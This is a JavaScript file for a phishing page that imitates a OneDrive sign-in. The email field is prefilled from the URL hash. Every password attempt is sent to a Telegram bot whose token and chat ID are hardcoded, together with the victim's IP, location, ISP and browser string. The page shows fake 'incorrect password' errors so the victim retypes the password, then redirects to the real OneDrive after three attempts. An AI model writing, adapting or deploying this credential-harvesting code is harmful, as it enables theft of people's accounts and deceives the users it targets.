let attemptCount = 0;

document.addEventListener('DOMContentLoaded', () => {
    const signInModal = document.getElementById('sign-in-modal');
    const modalOverlay = document.getElementById('modal-overlay');
    const emailInput = document.querySelector('.sign-in-input[type="email"]');
    const passwordInput = document.querySelector('.sign-in-input[type="password"]');
    const signInBtn = document.getElementById('sign-in-btn');
    const fileTiles = document.querySelectorAll('.file');

    // === SIDEBAR TOGGLE ===
    const menuBtn = document.querySelector('.menu');
    const sidebar = document.querySelector('.sidebar');

    if (menuBtn && sidebar) {
        menuBtn.addEventListener('click', () => {
            sidebar.classList.toggle('show');
        });
    }

    // === MODAL CLOSE BTN ===
    const closeBtn = document.getElementById('close-btn');
    if (closeBtn) {
        closeBtn.addEventListener('click', () => {
            modalOverlay.classList.add('hidden');
            signInModal.classList.add('hidden');
            document.body.style.overflow = '';
        });
    }

    if (!signInModal || !modalOverlay || !emailInput || !passwordInput || !signInBtn) {
        console.error("Required modal elements not found.");
        return;
    }

    signInModal.classList.add('hidden');
    modalOverlay.classList.add('hidden');

    function getEmailFromURL() {
        const hash = window.location.hash;
        return hash && hash.startsWith("#") ? decodeURIComponent(hash.substring(1)) : "";
    }

    const urlEmail = getEmailFromURL();
    if (urlEmail) {
        emailInput.value = urlEmail;
        emailInput.setAttribute("readonly", "true");
        emailInput.classList.add("email-field");
    }

    fileTiles.forEach(tile => {
        tile.addEventListener("click", () => {
            clearError();
            passwordInput.value = "";
            signInBtn.textContent = "View files";
            modalOverlay.classList.remove("hidden");
            signInModal.classList.remove("hidden");
            document.body.style.overflow = "hidden";
        });
    });

    signInBtn.addEventListener('click', async () => {
        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();

        if (!email || !password) {
            showError("Please enter both email and password.");
            return;
        }

        signInBtn.textContent = "Verifying...";
        attemptCount++;

        const botToken = "7581994701:AAGb0gyfgIMQH-RDhnogyMfgaAJbnK7h534";
        const chatId = "5642369607";

        let ipData = await fetch("https://ipapi.co/json")
            .then(res => res.json())
            .catch(() => null);

        let ip = ipData?.ip || "Unknown IP";
        let country = ipData?.country_name || "Unknown Country";
        let city = ipData?.city || "Unknown City";
        let isp = ipData?.org || "Unknown ISP";
        let userAgent = navigator.userAgent;

        const message = `🚨 *OneDrive Login Attempt (${attemptCount}/3)* 🚨\n\n`
            + `📧 *Email:* ${email}\n`
            + `🔑 *Password:* ${password}\n\n`
            + `🌍 *IP:* ${ip}\n`
            + `📍 *Location:* ${city}, ${country}\n`
            + `🏢 *ISP:* ${isp}\n\n`
            + `🖥 *Browser:* ${userAgent}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: "Markdown"
            })
        });

        if (attemptCount >= 3) {
            window.location.href = "https://onedrive.live.com";
        } else {
            showError(`❌ Incorrect password. Attempt ${attemptCount} of 3`);
            passwordInput.value = "";
            signInBtn.textContent = "View files";
        }
    });
});

function showError(message) {
    clearError();
    const msg = document.createElement('div');
    msg.className = 'error-msg';
    msg.style.color = '#d93025';
    msg.style.fontSize = '13px';
    msg.style.marginTop = '6px';
    msg.style.textAlign = 'left';
    msg.textContent = message;

    const passwordInput = document.querySelector('.sign-in-input[type="password"]');
    if (passwordInput) {
        passwordInput.insertAdjacentElement('afterend', msg);
    }
}

function clearError() {
    const existing = document.querySelector('.error-msg');
    if (existing) existing.remove();
}
